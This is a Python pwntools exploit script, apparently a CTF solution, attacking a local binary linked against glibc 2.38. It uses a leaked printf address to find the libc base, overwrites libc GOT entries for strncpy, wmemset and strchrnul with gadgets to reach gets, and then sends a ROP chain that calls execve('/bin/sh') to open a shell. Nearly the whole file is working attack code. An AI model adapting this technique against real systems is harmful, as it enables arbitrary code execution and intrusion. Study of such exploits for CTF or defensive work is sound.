#!/usr/bin/env python3
# coding=utf8

import inspect
from pwn import *

context.log_level = 'debug'

cn = process('./vuln-2.38')
libc = ELF("./libc-2.38.so")

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'

leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

'''
.got.plt:00000000001FE078 off_1FE078      dq offset strncpy       ; DATA XREF: j_strncpy+4↑r
.got.plt:00000000001FE080 off_1FE080      dq offset strlen        ; DATA XREF: j_strlen+4↑r
.got.plt:00000000001FE088 off_1FE088      dq offset wcscat        ; DATA XREF: j_wcscat+4↑r
.got.plt:00000000001FE090 off_1FE090      dq offset strcasecmp_l  ; DATA XREF: j_strcasecmp_l+4↑r
.got.plt:00000000001FE098 off_1FE098      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r
.got.plt:00000000001FE0A0 off_1FE0A0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r
.got.plt:00000000001FE0A8 off_1FE0A8      dq offset _dl_deallocate_tls
.got.plt:00000000001FE0B0 off_1FE0B0      dq offset __tls_get_addr
.got.plt:00000000001FE0B8 off_1FE0B8      dq offset wmemset       ; DATA XREF: j_wmemset_0+4↑r
.got.plt:00000000001FE0C0 off_1FE0C0      dq offset memcmp        ; DATA XREF: j_memcmp+4↑r
.got.plt:00000000001FE0C8 off_1FE0C8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r

# overwrite strchrnul.got with:
.text:0000000000177D59                 lea     rdi, [rsp+18h]
.text:0000000000177D5E                 mov     edx, 20h ; ' '
.text:0000000000177D63                 call    j_strncpy

# overwrite strncpy.got with:
.text:00000000000D60A8                 pop     rbx
.text:00000000000D60A9                 pop     rbp
.text:00000000000D60AA                 pop     r12
.text:00000000000D60AC                 pop     r13
.text:00000000000D60AE                 jmp     j_wmemset_0

# overwrite wmemset.got with `gets`
'''

strchrnul_gadget = lbase + 0x0000000000177D59
strncpy_gadget = lbase + 0x00000000000D60A8
gets_ptr = lbase + 0x0000000000082AE0

write_dest = lbase + 0x00000000001FE078
write_payload = flat(
    strncpy_gadget,
    0xdead0001,
    0xdead0002,
    0xdead0003,
    0xdead0004,
    0xdead0005,
    0xdead0006,
    0xdead0007,
    gets_ptr,
    0xdead0008,
    strchrnul_gadget,
)

prdi = lbase + 0x0000000000028715
binsh = lbase + 0x00000000001C041B
prsi = lbase + 0x000000000002a671
prdx_rbx = lbase + 0x0000000000093359
execve_ptr = lbase + 0x00000000000EAFF0

rop_payload = flat(
    prdi, binsh,
    prsi, 0,
    prdx_rbx, 0, 0,
    execve_ptr,
)

ss("write payload to {}, length {}".format(
    hex(write_dest), hex(len(write_payload))))
sd(p64(write_dest))
sd(p64(len(write_payload)))
sd(write_payload)

# trigger gets(stack), send rop gadget
sleep(0.1)
sl(rop_payload)

interact()
